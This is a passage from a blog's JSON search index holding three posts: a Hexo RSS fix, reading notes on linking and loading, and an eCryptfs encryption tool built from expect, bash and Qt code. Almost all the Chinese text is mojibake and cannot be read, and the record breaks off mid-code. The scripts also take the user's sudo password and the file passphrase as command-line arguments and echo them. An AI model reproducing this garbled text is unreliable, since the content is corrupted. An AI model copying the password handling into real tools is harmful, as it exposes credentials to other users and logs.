atom.xmlã€‚æ‰¾åˆ°ç¬¬317è¡Œ18åˆ—ï¼Œæ˜¯ä¸€ä¸ªæœªçŸ¥å­—ç¬¦å°æ–¹å—ï¼ˆåŸå› åº”è¯¥æ˜¯æˆ‘ä»æˆ‘çš„CSDNåšå®¢é‡Œé¢å¯¼å‡ºæ¥çš„æ–‡ç« ï¼Œå‡ºç°äº†ä¸€äº›æœªçŸ¥çš„é—®é¢˜ï¼‰ã€‚æ ¹æ®å°æ–¹å—å‰åå†…å®¹åˆ¤æ–­å‡ºæ¥æ˜¯å“ªä¸ªæ–‡ç« å‡ºç°çš„é—®é¢˜ã€‚\næ‰“å¼€å¯¹åº”çš„æ‰“å¼€å¯¹åº”æ–‡ç« çš„.mdæ–‡æ¡£ï¼Œæ‰¾åˆ°ç›¸åº”çš„çš„ä½ç½®ï¼Œæ›¿æ¢å‡ºé—®é¢˜çš„å­—ç¬¦ã€‚\né‡æ–°ç”Ÿæˆ rss.xml å¹¶éƒ¨ç½²: hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d\né—®é¢˜è§£å†³\nå…³é—­æ‰“èµåŠŸèƒ½ æš‚æ—¶ä¸éœ€è¦å¼€é€šæ‰“èµåŠŸèƒ½ï¼Œåœ¨theme-\u0026gt;next-\u0026gt;_config.ymlæ–‡ä»¶ä¸­æ³¨é‡Šæ‰æ‰“èµæ¨¡å—ã€‚\n# Reward\r# reward_comment: Donate comment here\r# wechatpay: /images/wechatpay.jpg\r# alipay: /images/alipay.jpg\r#bitcoin: /images/bitcoin.png\r","date":1525965231,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525965231,"objectID":"bb6e55216b9705d819a4aa4c04b6882b","permalink":"http://www.guozet.me/post/Use-Hexo-to-built-my-Blog/","publishdate":"2018-05-10T15:13:51Z","relpermalink":"/post/Use-Hexo-to-built-my-Blog/","section":"post","summary":"ä½¿ç”¨Jekyllæ­å»ºåœ¨githubä¸Šåšå®¢å·²ç»å¿«ä¸€å¹´äº†ï¼Œä½†ä¸€å¹´","tags":"Hexo","title":"ä½¿ç”¨Hexo+Nextä¸»é¢˜+Githubæ­å»ºåšå®¢","type":"post"},{"authors":null,"categories":"Fundamentals of Compiling","content":"ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»\u0026ndash;é“¾æ¥ã€è£…è½½ä¸åº“ã€‹ç¬¬ä¸€ç« é˜…è¯»ç¬”è®° Terry.Tang åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»\u0026ndash;é“¾æ¥ã€è£…è½½ä¸åº“ã€‹é˜…è¯»ç¬”è®°1/10 2017/4/18\nä¸€.åŸºæœ¬æ¦‚å¿µ å›é¡¾è®¡ç®—æœºè½¯ç¡¬ä»¶ä½“ç³»ä¸­çš„å‡ ä¸ªé‡è¦æ¦‚å¿µï¼Œåœ¨è®¡ç®—æœºç¹å¤šçš„ç¡¬ä»¶è®¾å¤‡ä¸­ï¼Œä¸‰ä¸ªéƒ¨ä»¶æœ€ä¸ºå…³é”®ï¼šé‡è¦å¤„ç†å™¨CPUã€å†…å­˜å’ŒI/0æ§åˆ¶èŠ¯ç‰‡ã€‚è€Œæˆ‘ä»¬ç¨‹åºå‘˜çš„ç›®çš„å°±æ˜¯å……åˆ†åˆ©ç”¨è¿™ä¸‰ä¸ªéƒ¨åˆ†ã€‚\nå—åŒ—æ¡¥ç»“æ„ è®¾è®¡åŸå› ï¼šåˆ†ç¦»ä½é€Ÿè®¾å¤‡å’Œé«˜é€Ÿè®¾å¤‡ï¼Œç®€åŒ–å•ä¸€çš„åŒ—æ¡¥ç»“æ„çš„è®¾è®¡æˆæœ¬ã€‚ è®¾è®¡æ–¹å¼ï¼šå—æ¡¥(ISA)è´Ÿè´£å¤„ç†ä½é€Ÿè®¾å¤‡\u0026mdash;Modern, Sound card, Printerç­‰ï¼›åŒ—æ¡¥(PCI)è´Ÿè´£å¤„ç†é«˜é€Ÿè®¾å¤‡\u0026mdash;å†…å­˜ï¼ŒUSBæ¥å£ï¼Œå›¾å½¢è®¾å¤‡ç­‰ï¼›å—åŒ—æ¡¥ç¡¬ä»¶ç»“æ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š SMPå’Œå¤šæ ¸ å¯¹ç§°å¤šå¤„ç†å™¨(SMP,Symmetrical Multi-Processingï¼‰: å¤šä¸ªCPUå¹¶è¡Œï¼Œæ‰€å¤„åœ°ä½å’ŒåŠŸèƒ½ä¸€æ ·ï¼Œç›¸äº’å¯¹ç§°çš„ã€‚\nç¼ºç‚¹ï¼šæˆ‘ä»¬çš„ç¨‹åºå¹¶ä¸èƒ½åŒæ—¶åˆ†è§£æˆå¤šä¸ªä¸ç›¸å¹²çš„å­é—®é¢˜åŒæ—¶è¿è¡Œåœ¨å„ä¸ªCPUä¸Šï¼›å¹¶ä¸”æˆæœ¬å¤ªé«˜\nä½¿ç”¨åœºåˆï¼šå¤§å‹æ•°æ®åº“ï¼Œç½‘ç»œæœåŠ¡å™¨ä¸Šï¼ŒåŒæ—¶å¤„ç†ç›¸äº’ç‹¬ç«‹çš„å¤§é‡è¯·æ±‚\næ”¹è¿›æ–¹å¼ï¼šä¿ç•™å¤šä¸ªæ ¸å¿ƒï¼Œå…±äº«ä»·æ ¼æ˜‚è´µçš„ç¼“å­˜éƒ¨ä»¶\u0026mdash;\u0026ndash;å¤šæ ¸å¤„ç†å™¨ï¼ˆMulti-core Processorï¼‰\nç³»ç»Ÿè½¯ä»¶ å¯å¤§è‡´åˆ†ä¸ºä¸¤ç±»ï¼š\n1.å¹³å°è½¯ä»¶\u0026mdash;æ“ä½œç³»ç»Ÿï¼Œé©±åŠ¨ç¨‹åºï¼Œè¿è¡Œåº“ï¼Œç³»ç»Ÿå·¥å…·ï¼ˆåº”ç”¨ç¨‹åºï¼‰\n2.è¾…åŠ©ç¨‹åºå¼€å‘\u0026mdash;ç¼–è¯‘å™¨ï¼Œæ±‡ç¼–å™¨ï¼Œé“¾æ¥å™¨ç­‰å¼€å‘å·¥å…·å’Œå¼€å‘åº“\næœ¬ä¹¦é‡ç‚¹ä»‹ç»ï¼šé“¾æ¥å™¨ï¼Œè¿è¡Œåº“å’Œå¼€å‘åº“\nè®¡ç®—æœºç³»ç»Ÿè½¯ä»¶ä½“ç³»ç»“æ„ä¸­\u0026ndash;åˆ†å±‚ç»“æ„çš„å‡ ä¸ªæ¦‚å¿µï¼š **æ¥å£(Interface)ï¼š**æ¯ä¸ªå±‚æ¬¡ä¹‹é—´ç›¸äº’é€šä¿¡çš„é€šä¿¡åè®®ï¼Œæ¥å£çš„ä¸‹é¢å±‚æ¥æä¾›å¹¶å®šä¹‰æ¥å£ï¼Œæ¥å£çš„ä¸Šé¢å±‚æ¥ä½¿ç”¨æ¥å£æä¾›çš„åŠŸèƒ½\u0026mdash;-æ¥å£å°½å¯èƒ½ä¿æŒä¸å˜ï¼Œå‘åå…¼å®¹ ä¸­é—´å±‚ï¼šé™¤äº†ç¡¬ä»¶å’Œåº”ç”¨ç¨‹åºï¼Œå…¶ä»–éƒ½æ˜¯ä¸­é—´å±‚ æ¯”å¦‚ï¼šç³»ç»Ÿè°ƒç”¨æ¥å£çš„å®ç°æ˜¯é€šè¿‡è½¯ä»¶ä¸­æ–­(Software Interrupt)çš„æ–¹å¼æä¾›çš„ï¼ŒLinux\u0026mdash;0x80ä¸­æ–­å·ï¼› Window\u0026mdash;0x2Eå·ä¸­æ–­\näºŒ.æ“ä½œç³»ç»Ÿ **ä¸¤ä¸ªåŠŸèƒ½ï¼š**æä¾›æŠ½è±¡çš„æ¥å£å’Œç®¡ç†ç¡¬ä»¶èµ„æº\n1.CPUåˆ©ç”¨ç‡ æ¼”å˜æ–¹å¼ï¼šå•ä¸€è¿è¡Œä¸€ä¸ªç¨‹åº\u0026ndash;\u0026gt;å¤šé“è¿è¡Œç¨‹åº\u0026ndash;\u0026gt;åˆ†æ‰‹ç³»ç»Ÿ\u0026mdash;\u0026gt;å¤šä»»åŠ¡ç³»ç»Ÿ(ä½¿å¾—å¤šè¿›ç¨‹èƒ½å¾ˆå¥½å…±äº«CPU) æ“ä½œç³»ç»Ÿæ¥ç®¡äº†æ‰€æœ‰çš„ç¡¬ä»¶èµ„æºï¼Œå¹¶ä¸”æœ¬èº«è¿è¡Œåœ¨ä¸€ä¸ªå—ç¡¬ä»¶ä¿æŠ¤çš„çº§åˆ«ã€‚æ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½ä»¥è¿›ç¨‹ï¼ˆProcessï¼‰çš„æ–¹å¼è¿è¡Œåœ¨æ¯”æ“ä½œç³»ç»Ÿæƒé™æ›´ä½çš„çº§åˆ«ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œä½¿å¾—è¿›ç¨‹ä¹‹é—´çš„åœ°å€ç©ºé—´ç›¸äº’éš”ç¦»ã€‚ å¤šä»»åŠ¡ç³»ç»Ÿä¸­ï¼šç›®å‰CPUåˆ†é…æ–¹å¼æ¯”è¾ƒæµè¡Œçš„æ˜¯æŠ¢å å¼(Preemptive)\u0026mdash;ä¼˜å…ˆçº§å†³å®š\n2.I/Oè®¾å¤‡é©±åŠ¨ æ“ä½œç³»ç»Ÿä½œä¸ºç¡¬ä»¶å±‚çš„ä¸Šå±‚ï¼Œæ˜¯å¯¹ç¡¬ä»¶çš„ç®¡ç†å’ŒæŠ½è±¡ï¼Œå…¶ä¸­çš„ç¡¬ä»¶è®¾å¤‡é©±åŠ¨ç¨‹åºå¤„ç†æ‰€æœ‰çš„ç¡¬ä»¶ç»†èŠ‚ï¼Œå®ƒå’Œæ“ä½œç³»ç»Ÿå†…æ ¸ä¸€èµ·è¿è¡Œåœ¨ç‰¹æƒçº§ï¼Œä½†å’Œå†…æ ¸åªæœ‰æœ‰ä¸€å®šçš„ç‹¬ç«‹æ€§ã€‚ è®¾å¤‡é©±åŠ¨ç¨‹åºçš„å¼€å‘å·¥ä½œä¸€èˆ¬ç”±ç¡¬ä»¶å‚å®¶å®Œæˆï¼Œæ“ä½œç³»ç»Ÿä¸ºå…¶æä¾›ç›¸åº”çš„æ¥å£å’Œæ¡†æ¶ï¼Œå‡¡æ˜¯æŒ‰ç…§è¿™ä¸ªæ¥å£å’Œæ¡†æ¶è¿›è¡Œå¼€å‘çš„é©±åŠ¨ç¨‹åºéƒ½èƒ½å¤Ÿã€‚\nä¸‰.å†…å­˜åˆ©ç”¨ å½“å¤šä»»åŠ¡ç³»ç»Ÿå‡ºç°ä¹‹åï¼ŒCPUçš„åˆ©ç”¨ç‡å¾—åˆ°æå‡ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æœ‰ä¸€ä¸ªæ˜æ˜¾çš„é—®é¢˜ï¼šå¦‚ä½•å°†è®¡ç®—æœºä¸Šæœ‰é™çš„ç‰©ç†å†…å­˜åˆ†é…ç»™å¤šä¸ªç¨‹åºä½¿ç”¨\nåŸå§‹çš„ç‰©ç†å†…å­˜ç›´æ¥ä½¿ç”¨çš„æ–¹å¼å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š\nåœ°å€ç©ºé—´ä¸éš”ç¦»ï¼šæ¶æ„çš„ç¨‹åºå¯ä»¥ä¿®æ”¹å…¶ä»–ç¨‹åºçš„å†…å­˜æ•°æ®ï¼Œå¯¼è‡´å…¶ä»–ä»»åŠ¡å´©æºƒ å†…å­˜ä½¿ç”¨æ•ˆç‡ä½ï¼šç¨‹åºæ‰§è¡Œæ—¶ï¼Œç›‘æ§ç¨‹åºéœ€è¦å°†æ•´ä¸ªç¨‹åºè£…å…¥å†…å­˜ä¸­å¼€å§‹è¿è¡Œï¼Œä»»åŠ¡åˆ‡æ¢æ—¶å€™ï¼Œå†…å­˜ä¸å¤Ÿï¼Œåˆ™å°†å½“å‰è¿è¡Œç¨‹åºå†™å›åˆ°ç£ç›˜ä¸­ã€‚\u0026mdash;å¤§é‡æ•°æ®æ¢å…¥æ¢å‡ºï¼Œæ•ˆç‡ååˆ†ä½ä¸‹ ç¨‹åºè¿è¡Œçš„åœ°å€ä¸ç¡®å®šï¼šå†…å­˜ç»™ç¨‹åºçš„ç©ºé—²åŒºåŸŸçš„ä½ç½®æ˜¯ä¸ç¡®å®šçš„ï¼Œä¸åˆ©äºç¼–å†™ç¨‹åºï¼Œå› ä¸ºç¨‹åºç¼–å†™æ—¶ï¼Œè®¿é—®æ•°æ®å’ŒæŒ‡ä»¤è·³è½¬æ—¶çš„ç›®çš„åœ°å€å¾ˆå¤šéƒ½æ˜¯å›ºå®šçš„ã€‚\n\u0026mdash;\u0026mdash;ä¸ºäº†è§£å†³è¿™å‡ ä¸ªé—®é¢˜ï¼Œå¢åŠ ä¸­é—´å±‚\u0026mdash;è™šæ‹Ÿåœ°å€ï¼Œé€šè¿‡æŸäº›æ˜ å°„çš„æ–¹å¼ï¼Œå°†æ•´ä¸ªè™šæ‹Ÿåœ°å€è½¬æ¢æˆå®é™…çš„ç‰©ç†åœ°å€ã€‚ 1.è§£å†³éš”ç¦»é—®é¢˜ ç¨‹åºçš„æœ€ä½³æ‰§è¡Œç¯å¢ƒï¼šä¸€ä¸ªå•ä¸€çš„åœ°å€ç©ºé—´ï¼Œè‡ªå·±çš„CPUï¼Œå æœ‰æ•´ä¸ªè®¡ç®—æœºèµ„æºä¸ç”¨å…³å¿ƒå…¶ä»–çš„ç¨‹åºã€‚ åœ°å€ç©ºé—´æ¦‚å¿µï¼šå¯æƒ³è±¡æˆä¸€ä¸ªå¾ˆå¤§çš„æ•°ç»„ï¼Œæ¯ä¸ªæ•°ç»„çš„å…ƒç´ æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œè¿™ä¸ªæ•°ç»„å¤§å°ç”±åœ°å€ç©ºé—´çš„åœ°å€é•¿åº¦å†³å®šï¼Œæ¯”å¦‚32ä½ï¼ˆåœ°å€çº¿å†³å®šæ˜¯å¤šå°‘ä½ï¼‰çš„åœ°å€ç©ºé—´ä½4GBã€‚\nåœ°å€ç©ºé—´å¯åˆ†ä¸ºè™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆVirtual Address Spaceï¼‰ \u0026amp; ç‰©ç†åœ°å€ç©ºé—´ï¼ˆPhysical Address Spaceï¼‰\næ³¨æ„ï¼šç‰©ç†åœ°å€ç©ºé—´å¯èƒ½æ˜¯4Gï¼Œä½†æ˜¯å¯èƒ½ç”±äºå†…å­˜æ¡åªæœ‰2Gï¼Œæ‰€æœ‰æœ‰æ•ˆçš„ç‰©ç†åœ°å€å°±åªæ˜¯å‰é¢2Gäº† è§£å†³åœ°å€ç©ºé—´ä¸éš”ç¦»å’Œè¿è¡Œåœ°å€ä¸ç¡®å®šçš„æ–¹å¼\u0026mdash;\u0026mdash;-åˆ†æ®µ(Segmentation)\nåˆ†æ®µ(Segmentation) ç”±æ“ä½œç³»ç»Ÿè®¾ç½®æ˜ å°„å‡½æ•°,å®é™…ç”±ç¡¬ä»¶å®Œæˆï¼Œå°†ç¨‹åºæ‰€éœ€è¦çš„å†…å­˜å¤§å°çš„è™šæ‹Ÿç©ºé—´æ˜ å°„åˆ°æŸä¸ªåœ°å€ç©ºé—´ã€‚ è§£å†³å†…å­˜ä½¿ç”¨æ•ˆç‡ä½ä¸‹çš„é—®é¢˜\u0026mdash;\u0026mdash;-åˆ†é¡µ(Paging)\nåˆ†é¡µ(Paging)** æ¦‚å¿µï¼šæŠŠåœ°å€ç©ºé—´(è™šæ‹Ÿ\u0026amp;ç‰©ç†)äººä¸ºåœ°ç­‰åˆ†æˆå›ºå®šå¤§å°çš„é¡µï¼Œæ¯ä¸€é¡µçš„å¤§å°ç”±ç¡¬ä»¶å†³å®šï¼Œæˆ–è€…ç¡¬ä»¶æ”¯æŒå¤šç§å¤§å°çš„é¡µï¼Œç”±æ“ä½œç³»ç»Ÿæ¥é€‰æ‹©å†³å®šé¡µçš„å¤§å°ã€‚\nå½“æˆ‘ä»¬æŠŠè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´æŒ‰é¡µåˆ†å‰²ï¼ŒæŠŠå¸¸ç”¨çš„æ•°æ®å’Œä»£ç é¡µè£…è½½åˆ°å†…å­˜ä¸­ï¼ŒæŠŠä¸å¸¸ç”¨çš„ä»£ç å’Œæ•°æ®ä¿å­˜åˆ°ç£ç›˜ä¸­ï¼Œåœ¨éœ€è¦ç”¨çš„æ—¶å€™å†æŠŠå®ƒä»ç£ç›˜ä¸­å–å‡ºæ¥å³å¯(é¡µé”™è¯¯ä¸­æ–­)ã€‚\n![è¿™é‡Œå†™å›¾ç‰‡æè¿°](http://img.blog.csdn.net/20170418201138609?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdGFuZzE1MjQ1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\ræ³¨æ„ï¼šè™šæ‹Ÿå­˜å‚¨çš„ä½¿ç”¨ä¾é MMUçš„éƒ¨ä»¶(é›†æˆåœ¨CPUå†…éƒ¨)æ¥å®Œæˆé¡µæ˜ å°„ã€‚\n","date":1525871067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525871067,"objectID":"d177fd8992249872ffac8f6592d6d412","permalink":"http://www.guozet.me/post/Programmers-self-cultivation-link-loading-library/","publishdate":"2018-05-09T13:04:27Z","relpermalink":"/post/Programmers-self-cultivation-link-loading-library/","section":"post","summary":"ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»\u0026ndash;é“¾æ¥ã€è£…è½½ä¸åº“ã€‹ç¬¬ä¸€ç« é˜…è¯»ç¬”","tags":"Compiling","title":"ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»--é“¾æ¥ã€è£…è½½ä¸åº“_é˜…è¯»ç¬”è®°","type":"post"},{"authors":null,"categories":"Linux","content":"ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š\nç¬¬ä¸€éƒ¨åˆ†æ˜¯äº¤äº’è„šæœ¬ä¸è‡ªåŠ¨åŒ–è„šæœ¬(Ubuntu)\nç¬¬äºŒéƒ¨åˆ†æ˜¯ç•Œé¢è®¾è®¡\nç¬¬ä¸‰éƒ¨åˆ†æ˜¯å¼€æºé¡¹ç›®ä»£ç çš„è¯´æ˜\nç”¨æˆ·ä½¿ç”¨çš„æ˜¯åŸºäºQTçš„ç”¨æˆ·ç•Œé¢ï¼Œå¯ä»¥é€‰æ‹©éœ€è¦åŠ å¯†çš„æ–‡ä»¶è·¯å¾„ï¼Œå·²ç»åŠ å¯†ä¹‹åçš„è·¯å¾„ã€‚å½“å›¾å½¢ç•Œé¢æ¥æ”¶åˆ°è¿™äº›ä¿¡æ¯ä¹‹åï¼Œä¼šå°†è¯¥ä¿¡æ¯è½¬æ¢æˆä¸€æ®µåŒ…å«äº†8ä¸ªå‚æ•°çš„æ•°æ®åŒ…ä¼ é€’ç»™shellè„šæœ¬è¿›è¡Œå¤„ç†ã€‚\nä¸€.äº¤äº’è„šæœ¬ä¸è‡ªåŠ¨åŒ–è„šæœ¬ 1. å¤„ç†äº¤äº’å¼è¿‡ç¨‹çš„è„šæœ¬ #!/usr/bin/expect\r#è¯¥æ–‡ä»¶æ˜¯å¤„ç†äº¤äº’å¼è¿‡ç¨‹çš„ä¸»è¦æ–‡ä»¶ï¼Œç”¨æ¥å¯¹è¾“å‡ºä¿¡æ¯è¿›è¡Œè§£æï¼Œå¹¶è‡ªåŠ¨è¾“å…¥å¯¹åº”çš„ä¿¡æ¯\rset timeout 2\rset ecryptfs_real [lindex $argv 0]\r#çœŸå®æ–‡ä»¶è·¯å¾„,å®é™…çš„åŠ å¯†æ–‡ä»¶ä½ç½®\rset ecryptfs_mount [lindex $argv 1]\r#æŒ‚è½½ç‚¹è·¯å¾„ï¼Œè§£å¯†æ–‡ä»¶çš„ä½ç½®\rset tangpassword [lindex $argv 2]\r#ç”¨æˆ·å¯†ç \rset key_type1 [lindex $argv 3]\r#å¯†ç ç®¡ç†æ–¹å¼\rset Passphrase [lindex $argv 4]\r#æ–‡ä»¶åŠ å¯†å¯†ç \rset ecryptfs_type [lindex $argv 5]\r#æ–‡ä»¶åŠ å¯†ç±»å‹\rset key_bytes [lindex $argv 6]\r#æ–‡ä»¶åŠ å¯†ä½æ•°\rset ecryptfs_fspath [lindex $argv 7]\r#è·¯å¾„æ˜¯å¦åŠ å¯†\rset ecryptfs_filename [lindex $argv 8]\r#æ–‡ä»¶åæ˜¯å¦åŠ å¯†\rspawn sudo mount -t ecryptfs $ecryptfs_real $ecryptfs_mount#æŒ‚è½½åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ\rexpect \u0026quot;password for tang:\u0026quot;\rsend \u0026quot;$tangpassword\\n\u0026quot;\r#å¡«å……ç”¨æˆ·å¯†ç \rexpect \u0026quot;Select key type to use for newly created files:\u0026quot;\rsend \u0026quot;$key_type1\\n\u0026quot;\rexpect\r#å¡«å……åŠ å¯†æ–¹å¼ç±»å‹ \u0026quot;Passphrase:\u0026quot;\rsend \u0026quot;$Passphrase\\n\u0026quot;\r#å¡«å……æ–‡ä»¶åŠ å¯†å¯†ç \rexpect \u0026quot;aes\u0026quot;\rsend \u0026quot;$ecryptfs_type\\n\u0026quot;\r#å¡«å……æ–‡ä»¶åŠ å¯†ç±»å‹\rexpect \u0026quot;Select key bytes:\u0026quot;\rsend \u0026quot;$key_bytes\\n\u0026quot;\r#å¡«å†™æ–‡ä»¶åŠ å¯†ä½æ•°\rexpect \u0026quot;Enable plaintext passthrough\u0026quot;\rsend \u0026quot;$ecryptfs_fspath\\n\u0026quot;\r#é€‰æ‹©æ˜¯å¦å¯¹è·¯å¾„åŠ å¯†\rexpect \u0026quot;Enable filename encryption\u0026quot;\rsend \u0026quot;$ecryptfs_filename\\r\u0026quot;\rinteract\r#é€‰æ‹©æ˜¯å¦å¯¹æ–‡ä»¶ååŠ å¯†\r#expect eof\r#exit\r2. ä¸QTäº¤äº’çš„è„šæœ¬ #!/bin/bash\r##è¯¥è„šæœ¬ä¸»è¦ä½œç”¨æ˜¯æ¥æ”¶QTä¼ é€’è¿‡æ¥çš„å˜é‡ï¼Œå¹¶è¿›è¡Œè§£æï¼Œä¹‹åï¼Œè°ƒç”¨ç›¸åº”çš„äº¤äº’å¤„ç†è„šæœ¬##æ¥æ”¶QTä¼ é€’è¿‡æ¥çš„å˜é‡\rECRYPTFS_REAL=$1\t##è·å–åŠ å¯†è·¯å¾„\rPASSWD=$2\t##ç”¨æˆ·å¯†ç \rPASS_TYPE=$3\t##å¯†ç ç±»å‹\rPASSPHRASE=$4\t##åŠ å¯†è·¯å¾„ï¼ŒæŒ‚è½½ç‚¹\rECRYPTFS_TYPE=$5\t##åŠ å¯†ç±»å‹\rECRYPTFS_BIT=$6\t##åŠ å¯†ä½æ•°\rECRYPTFS_FS=$7\t##è·¯å¾„æ˜¯å¦åŠ å¯†\rECRYPTFS_FILENAME=$8 ##æ–‡ä»¶åæ˜¯å¦åŠ å¯†\rcount=0 ##åˆå§‹å€¼\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot; ##åˆå§‹æŒ‚è½½ç‚¹\recho \u0026quot;EcryptfsåŠ å¯†ç¨‹åºå¯åŠ¨ä¸­...\u0026quot;\recho \u0026quot;ç”³è¯·è¶…çº§ç”¨æˆ·æƒé™,è¯·è¾“å…¥ç”¨æˆ·å¯†ç \u0026quot;\r##/bin/testpass\rdf 1\u0026gt;/tmp/1.txt 2\u0026gt;/dev/null\r##æ£€æµ‹å½“å‰å·²ç»ä½¿ç”¨çš„æŒ‚è½½ç‚¹ï¼Œå»ºç«‹ä¸€ä¸ªæ–°çš„æŒ‚è½½ç‚¹æ¥ä½¿ç”¨\recho \u0026quot;å·²ç»æŒ‚è½½çš„åŠ å¯†ç›®å½•æœ‰ï¼š\u0026quot;\rwhile cat /tmp/1.txt | grep -q $dir 2\u0026gt;/dev/null\r##æŒ‚è½½ç‚¹ æ˜¯å¦ä½¿ç”¨äº†\rdo\recho $dir\rlet count=$count+1 ##ä¸€å®šè¦æ˜¯/bin/bashå¦‚æ˜¯/bin/shè¿™é‡Œå°±ä¼šå‡ºé”™\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot; ###æ–°æŒ‚è½½ç‚¹\rdone\rrm /tmp/1.txt\recho \u0026quot;æ–°å¢æŒ‚è½½ç›®å½•ï¼š\u0026quot; ###åˆ›å»ºæ–°çš„æŒ‚è½½ç‚¹\rif [ ! -d $dir ];then ##åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨\rmkdir -p $dir ###å»ºç«‹æ–°æŒ‚è½½ç‚¹ç›®å½•,é€‰é¡¹pï¼Œå¯ä»¥åˆ›å»ºè¿ç»­æ–‡ä»¶å¤¹\rfi\recho \u0026quot;åŠ å¯†ç¨‹åºå¯åŠ¨ï¼Œå¼€å§‹åŠ å¯†â€¦â€¦\recho \u0026quot;è¯·è¾“å…¥åŠ å¯†å¯†ç ï¼Œé€‰æ‹©åŠ å¯†æ–¹å¼ï¼š\u0026quot;\r## sudo mount -t ecryptfs $(pwd) $dir ### $( )ä¸ºå¼•ç”¨å‘½ä»¤ç»“æœ\r##è°ƒç”¨äº¤äº’è„šæœ¬æ¥å¤„ç†å’Œç”¨æˆ·çš„äº¤äº’è¿‡ç¨‹\recho $ECRYPTFS_REAL $dir $PASSWD $ECRYPTFS_TYPE $ECRYPTFS_BIT $ECRYPTFS_FS $ECRYPTFS_FILENAME\r/bin/automount $ECRYPTFS_REAL $dir $PASSWD $PASS_TYPE $PASSPHRASE $ECRYPTFS_TYPE $ECRYPTFS_BIT $ECRYPTFS_FS $ECRYPTFS_FILENAME\r3. æŒ‚è½½ç‚¹æ“ä½œè„šæœ¬ #!/bin/bash\r##ç”¨æ¥å¯¹å½“å‰æŒ‚è½½ç‚¹è¿›è¡Œå¸è½½åˆ é™¤\rcount=0\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot;\rgksudo df 1\u0026gt;/tmp/1.txt\rwhile cat /tmp/1.txt |grep -q $dir 2\u0026gt;/dev/null\t##æ£€æŸ¥ç°åœ¨å­˜åœ¨çš„æŒ‚è½½\rdo\recho $dir\rlet count=$count+1\rsudo umount $dir \u0026amp;\u0026amp; rmdir $dirã€€##å¸è½½æŒ‚è½½ç‚¹ï¼Œå¸è½½æˆåŠŸçš„å‰æä¸‹åˆ é™¤æŒ‚è½½ç‚¹\rdir=\u0026quot;/tmp/mnt/ecryptfs$count\u0026quot;\rdone\r4. æ·»åŠ åˆ°é¼ æ ‡å³é”®èœå•çš„æ‰§è¡Œè„šæœ¬ #!/bin/bash\r##æ·»åŠ åˆ°å³é”®çš„æ‰§è¡Œè„šæœ¬ï¼Œç”¨æ¥æ‰“å¼€QTäº¤äº’å¼ç•Œé¢ï¼Œè·å–ç”¨æˆ·çš„è¾“å…¥ä¿¡æ¯\r/home/tang/ecryptfs/imageconverter\r#/bin/ecryptfs_mounted.sh\u0026amp;\r5. åœ¨QTè°ƒç”¨æ‰§è¡ŒæŒ‚è½½è„šæœ¬ #!/bin/bash\r##åœ¨QTä¸­è°ƒç”¨è¯¥è„šæœ¬ï¼Œè¯¥è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯æ‰§è¡ŒæŒ‚è½½è„šæœ¬ecryptfs_mounted.sh\rREALFILE=$1\rECRYPTFSPATH=\u0026quot;/bin/ecryptfs_mounted.sh $REALFILE\u0026quot;\recho $REALFILE 1\u0026gt;/TMP/2.txt\recho\r$ECRYPTFSPATH 1\u0026gt;\u0026gt;/tmp/2.txt\rexec\r$ECRYPTFSPATH\r#exec gnome-terminal -x\r$ECRYPTFSPATH\r#/bin/ecryptfs_mounted.sh\u0026amp;\räºŒ. ï¼±ï¼´ç•Œé¢ç¨‹åºè®¾è®¡ #include \u0026lt;QtGui\u0026gt;\r#include \u0026quot;convertdialog.h\u0026quot;\rConvertDialog::ConvertDialog(QWidget *parent)\r: QDialog(parent)\r{\rsetupUi(this); //åˆ›å»ºå¹¶å¸ƒå±€å¥½æ‰€æœ‰çš„çª—å£éƒ¨ä»¶\rpasswordEdit-\u0026gt;setEchoMode (QLineEdit::Password);//ç”¨æˆ·å£ä»¤è¾“å…¥æ¡†\rfilepasswordEdit-\u0026gt;setEchoMode (QLineEdit::Password);//æ–‡ä»¶å¯†ç è¾“å…¥æ¡†\r}\rvoid ConvertDialog::on_browseButton_clicked()//é€‰æ‹©è·¯å¾„æŒ‰é’®è§¦å‘\r{\rQString initialName = sourceFileEdit-\u0026gt;text();//åŠ å¯†æ–‡ä»¶å¤¹è·¯å¾„è¾“å…¥æ¡†\rif (initialName.isEmpty())\rinitialName = QDir::homePath();//ä¸ºç©ºï¼Œä½¿ç”¨é»˜è®¤è·¯å¾„\rQString fileName =\rQFileDialog::getExistingDirectory(this, tr(\u0026quot;Choose File\u0026quot;),\rinitialName);//å¼¹å‡ºè®¡ç®—æœºè·¯å¾„é€‰æ‹©æ¡†ï¼Œé€‰æ‹©è·¯å¾„åŠ å¯†\rfileName = QDir::toNativeSeparators(fileName);//åŠ å¯†è·¯å¾„\rif (!fileName.isEmpty()) {\rsourceFileEdit-\u0026gt;setText(fileName);//å°†è·¯å¾„ä¿¡æ¯ä¿å­˜èµ·æ¥\r// 